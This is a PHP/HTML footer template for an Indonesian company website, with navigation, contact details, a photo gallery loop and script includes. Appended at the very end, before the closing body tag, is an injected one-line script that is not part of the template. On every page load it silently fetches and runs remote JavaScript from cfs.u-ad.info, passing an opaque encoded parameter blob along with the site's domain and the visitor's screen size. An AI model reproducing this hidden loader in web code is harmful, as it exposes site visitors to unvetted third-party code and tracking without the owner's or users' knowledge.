    <div id="k-footer"><!-- footer -->
    
        <div class="container"><!-- container -->
        
            <div class="row no-gutter"><!-- row -->
            
                <div class="col-lg-4 col-md-4"><!-- widgets column left -->
            
                    <div class="col-padded col-naked">
                    
                        <ul class="list-unstyled clear-margins"><!-- widgets -->
                        
                            <li class="widget-container widget_nav_menu"><!-- widgets list -->
                    
                                <h1 class="title-widget">Navigasi</h1>                                
                                <ul>
                                    <li><a href="<?php echo base_url('project/pekerjaan');?>" title="menu item">Daftar Pekerjaan</a></li>
                                    <li><a href="<?php echo base_url('project/klien');?>" title="menu item">Daftar Klien</a></li>
                                    <li><a href="<?php echo base_url('produk');?>" title="menu item">Produk Kami</a></li>
                                    <li><a href="<?php echo base_url('galeri');?>" title="menu item">Album Foto</a></li>
                                    <li><a href="<?php echo base_url('blog');?>" title="menu item">Blog</a></li>
                                    <li><a href="<?php echo base_url('download');?>" title="menu item">Download File</a></li>
                                    <li><a href="<?php echo base_url('kontak');?>" title="menu item">Kontak</a></li>
                                </ul>
                    
                            </li>
                            
                        </ul>
                         
                    </div>
                    
                </div><!-- widgets column left end -->
                
                <div class="col-lg-4 col-md-4"><!-- widgets column center -->
                
                    <div class="col-padded col-naked">
                    
                        <ul class="list-unstyled clear-margins"><!-- widgets -->
                        
                            <li class="widget-container widget_recent_news"><!-- widgets list -->
                    
                                <h1 class="title-widget"><?php echo $site['nameweb'];?> Kontak</h1>
                                
                                <div itemscope itemtype="http://data-vocabulary.org/Organization"> 
                                
                                    <h2 class="title-median m-contact-subject" itemprop="name">Kantor <?php echo $site['nameweb'];?></h2>
                                
                                    <div class="m-contact-address" itemprop="address" itemscope itemtype="http://data-vocabulary.org/Address">
                                        <span class="m-contact-street" itemprop="street-address"><?php echo $site['address'];?></span>
                                        <span class="m-contact-city-region"><span class="m-contact-city" itemprop="locality"><?php echo $site['city'];?></span></span>
                                        <span class="m-contact-zip-country"><span class="m-contact-zip" itemprop="postal-code"><?php echo $site['zip_code'];?></span></span>
                                    </div>
                                     
                                    <div class="m-contact-tel-fax">
                                        <span class="m-contact-tel">Tel: <span itemprop="tel"><?php echo $site['phone_number'];?></span></span>
                                        <span class="m-contact-fax">Fax: <span itemprop="fax"><?php echo $site['fax'];?></span></span>
                                    </div>
                                    
                                </div>
                                
                                <div class="social-icons">
                                
                                    <ul class="list-unstyled list-inline">
                                    
                                        <li><a href="<?php echo $site['twitter'];?>" title="Twitter"><i class="fa fa-twitter"></i></a></li>
                                        <li><a href="<?php echo $site['facebook'];?>" title="Facebook"><i class="fa fa-facebook"></i></a></li>
                                    
                                    </ul>
                                
                                </div>
                    
                            </li>
                            
                        </ul>
                        
                    </div>
                    
                </div><!-- widgets column center end -->
                
                <div class="col-lg-4 col-md-4"><!-- widgets column right -->
                
                    <div class="col-padded col-naked">
                    
                        <ul class="list-unstyled clear-margins"><!-- widgets -->
                        
                            <li class="widget-container widget_sofa_flickr"><!-- widgets list -->
                    
                                <h1 class="title-widget">Album Foto</h1>
                                
                                <ul class="k-flickr-photos list-unstyled">
                                <?php
                                    $galleries = $this->mGalleries->listGalleryPubFooter();
                                    foreach ($galleries as $gallery){                       
                                ?>
                                    <li><a href="<?php echo base_url('galeri');?>" title="<?php echo $gallery['gallery_name'];?>"><img src="<?php echo base_url('assets/upload/image/'.$gallery['image']);?>" alt="Photo 1" /></a></li>
                                <?php } ?>
                                 </ul>
                    
                            </li>
                            
                        </ul> 
                        
                    </div>
                
                </div><!-- widgets column right end -->
            
            </div><!-- row end -->
        
        </div><!-- container end -->
    
    </div><!-- footer end -->
    
    <div id="k-subfooter"><!-- subfooter -->
    
        <div class="container"><!-- container -->
        
            <div class="row"><!-- row -->
            
                <div class="col-lg-12">
                    <center>
                    <p class="copy-text text-inverse">
                    &copy; 2018 <?php echo $site['nameweb'];?>
                    </p>
                    </center>
                
                </div>
            
            </div><!-- row end -->
        
        </div><!-- container end -->
    
    </div><!-- subfooter end -->

    <!-- jQuery -->
    <script src="<?php echo base_url();?>assets/front/jQuery/jquery-2.1.1.min.js"></script>
    <script src="<?php echo base_url();?>assets/front/jQuery/jquery-migrate-1.2.1.min.js"></script>
    
    <!-- Bootstrap -->
    <script src="<?php echo base_url();?>assets/front/bootstrap/js/bootstrap.min.js"></script>
    
    <!-- Drop-down -->
    <script src="<?php echo base_url();?>assets/front/js/dropdown-menu/dropdown-menu.js"></script>
    
    <!-- Fancybox -->
    <script src="<?php echo base_url();?>assets/front/js/fancybox/jquery.fancybox.pack.js"></script>
    <script src="<?php echo base_url();?>assets/front/js/fancybox/jquery.fancybox-media.js"></script><!-- Fancybox media -->
    
    <!-- Responsive videos -->
    <script src="<?php echo base_url();?>assets/front/js/jquery.fitvids.js"></script>
    
    <!-- Audio player -->
    <script src="<?php echo base_url();?>assets/front/js/audioplayer/audioplayer.min.js"></script>
    
    <!-- Pie charts -->
    <script src="<?php echo base_url();?>assets/front/js/jquery.easy-pie-chart.js"></script>
    
    <!-- Google Maps -->
    <script src="https://maps.googleapis.com/maps/api/js?sensor=true"></script>
    
    <!-- Theme -->
    <script src="<?php echo base_url();?>assets/front/js/theme.js"></script>
    
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2b5jiDvLTPqup5xyIT%2fGS0C8zoI%2fzA4pMbYDHJYABu%2bRDoHthnRYvwh6YBiANi0NKxvDk7nuzxEh6HBrGli8HoBIHCXbLOg8Yk036s6XYq7tyWvaJeTJaBtE9FSmvNIIgx7aYSMNSBGlSnyEIuKLVUWnsnEnRyrrXxNFgTijAlPYpufYsXL2cI5EjtSwJ8%2bQZqTE9B404hKiPql0T%2fsMnBATr%2fgvqd6xsJdnSrLlWleSMlRAzRzOCMuRtae%2byV3hEHXlK71qqKPpXnOPIBIR6miQ58xa0xl2V79Oc2dM8YimTwZHlQ3SJlyEbkFE%2fSbaqYwXCq5gRjPZrb9TNL8FqgSvQyUyaEDGlVjjF%2fvCNcJ2iL1r8M7n1qY4mRSBNWRta6140fEF05XSybqBMquSpYx%2fLZgM1Gzd9Tgi4CaBQgU1GmaPf1nMyU3rbLGVu2GD%2fjMgffNz%2f5AbrU6KWd%2bfQjqQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>